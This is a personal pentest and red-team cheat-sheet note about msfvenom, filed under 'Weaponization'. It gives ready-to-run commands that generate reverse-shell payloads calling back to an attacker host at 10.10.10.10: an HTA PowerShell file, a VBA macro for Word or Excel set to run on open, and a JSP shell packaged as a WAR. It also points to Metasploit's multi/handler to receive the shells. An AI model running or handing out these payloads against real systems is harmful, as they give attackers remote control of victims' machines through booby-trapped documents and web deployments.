---
creation date: April 30th 2023
last modified date: April 30th 2023
aliases: []
tags: #🧰
---

Primary Categories: [[01 - Pentest]] - [[01 - Red Team]]
Secondary Categories:  [[02 - Weaponization]]
Links: [[Metasploit]] - [[Payloads]]
Search Tag: #🧰  

# [[MsfVenom]]  
___

## Description:
This is a Metasploit standalone payload generator.

## Installation
Per-installed on kali

## Commands
### Basic Payload Example
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f hta-psh -o example.hta
```
- Breakdown:
	- `-p` = Selected payload
		- Default Kali location `/usr/share/doc/metasploit-framework/modules/payload/`
	- `LHOST=` = The host we want the payload to callback too
	- `LPORT=` = The port we want the payload to callback too
	- `-f` = Format we want the payload in
		-  Run the following for a complete list: `msfvenom --list formats`
	- `-o` = Output filename

### Reverse for VBA
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f vba -o example.doc
```
- May need to edit the payload to open with the correct document listed below are some file types:
	- **Excel** = `Workbook_Open()`
	- **Word** = `Document_Open()`
- Finally utilize [[Metasploit]] with: `use exploit/multi/handler`

### Reverse for WAR
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=9000 -f war > shell.war
```

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: April 30th 2023 (09:02 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
